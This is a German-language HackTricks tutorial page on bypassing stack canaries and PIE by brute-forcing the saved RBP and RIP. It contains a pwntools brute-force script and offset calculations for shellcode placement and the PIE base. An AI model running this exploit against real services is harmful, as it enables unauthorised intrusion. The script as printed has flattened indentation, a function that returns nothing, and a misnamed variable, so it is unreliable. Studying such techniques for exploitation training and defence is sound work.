# BF-Adressen im Stack

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

**Wenn du es mit einer Bin√§rdatei zu tun hast, die durch einen Canary und PIE (Position Independent Executable) gesch√ºtzt ist, musst du wahrscheinlich einen Weg finden, sie zu umgehen.**

![](<../../../.gitbook/assets/image (865).png>)

{% hint style="info" %}
Beachte, dass **`checksec`** m√∂glicherweise nicht erkennt, dass eine Bin√§rdatei durch einen Canary gesch√ºtzt ist, wenn diese statisch kompiliert wurde und die Funktion nicht identifizieren kann.\
Du kannst dies jedoch manuell feststellen, wenn du bemerkst, dass ein Wert zu Beginn eines Funktionsaufrufs im Stack gespeichert wird und dieser Wert vor dem Verlassen √ºberpr√ºft wird.
{% endhint %}

## Brute-Force-Adressen

Um **PIE zu umgehen**, musst du **eine Adresse leaken**. Und wenn die Bin√§rdatei keine Adressen leakt, ist es am besten, **die im Stack gespeicherten RBP- und RIP-Werte** in der verwundbaren Funktion zu brute-forcen.\
Wenn beispielsweise eine Bin√§rdatei sowohl durch einen **Canary** als auch durch **PIE** gesch√ºtzt ist, kannst du mit dem Brute-Forcen des Canaries beginnen, dann werden die **n√§chsten** 8 Bytes (x64) das gespeicherte **RBP** und die **n√§chsten** 8 Bytes das gespeicherte **RIP** sein.

{% hint style="success" %}
Es wird angenommen, dass die R√ºcksprungadresse im Stack zum Hauptbin√§rcode geh√∂rt, was normalerweise der Fall ist, wenn die Verwundbarkeit im Bin√§rcode liegt.
{% endhint %}

Um das RBP und das RIP aus der Bin√§rdatei zu brute-forcen, kannst du herausfinden, dass ein g√ºltig geratenes Byte korrekt ist, wenn das Programm etwas ausgibt oder einfach nicht abst√ºrzt. Die **gleiche Funktion**, die zum Brute-Forcen des Canaries bereitgestellt wird, kann verwendet werden, um das RBP und das RIP zu brute-forcen:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
Das letzte, was Sie ben√∂tigen, um das PIE zu besiegen, ist, **n√ºtzliche Adressen aus den geleakten** Adressen zu berechnen: die **RBP** und die **RIP**.

Von der **RBP** aus k√∂nnen Sie berechnen, **wo Sie Ihre Shell im Stack schreiben**. Dies kann sehr n√ºtzlich sein, um zu wissen, wo Sie die Zeichenfolge _"/bin/sh\x00"_ im Stack schreiben werden. Um die Entfernung zwischen der geleakten RBP und Ihrem Shellcode zu berechnen, k√∂nnen Sie einfach einen **Breakpoint nach dem Leaken der RBP setzen** und √ºberpr√ºfen, **wo sich Ihr Shellcode befindet**. Dann k√∂nnen Sie die Entfernung zwischen dem Shellcode und der RBP berechnen:
```python
INI_SHELLCODE = RBP - 1152
```
Von der **RIP** k√∂nnen Sie die **Basisadresse der PIE-Bin√§rdatei** berechnen, die Sie ben√∂tigen, um eine **g√ºltige ROP-Kette** zu erstellen.\
Um die Basisadresse zu berechnen, f√ºhren Sie einfach `objdump -d vunbinary` aus und √ºberpr√ºfen Sie die letzten Adressen der Disassemblierung:

![](<../../../.gitbook/assets/image (479).png>)

In diesem Beispiel sehen Sie, dass nur **1 Byte und ein halbes Byte ben√∂tigt werden**, um den gesamten Code zu lokalisieren. Die Basisadresse in dieser Situation wird die **geleakte RIP sein, die auf "000" endet**. Wenn Sie beispielsweise `0x562002970ecf` geleakt haben, ist die Basisadresse `0x562002970000`.
```python
elf.address = RIP - (RIP & 0xfff)
```
## Verbesserungen

Laut [**einigen Beobachtungen aus diesem Beitrag**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#extended-brute-force-leaking) ist es m√∂glich, dass der Server beim Leaken von RBP- und RIP-Werten nicht abst√ºrzt, wenn einige Werte nicht die richtigen sind, und das BF-Skript denkt, es h√§tte die richtigen erhalten. Das liegt daran, dass **einige Adressen es einfach nicht brechen werden, selbst wenn sie nicht genau die richtigen sind**.

Laut diesem Blogbeitrag wird empfohlen, eine kurze Verz√∂gerung zwischen den Anfragen an den Server einzuf√ºhren.

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
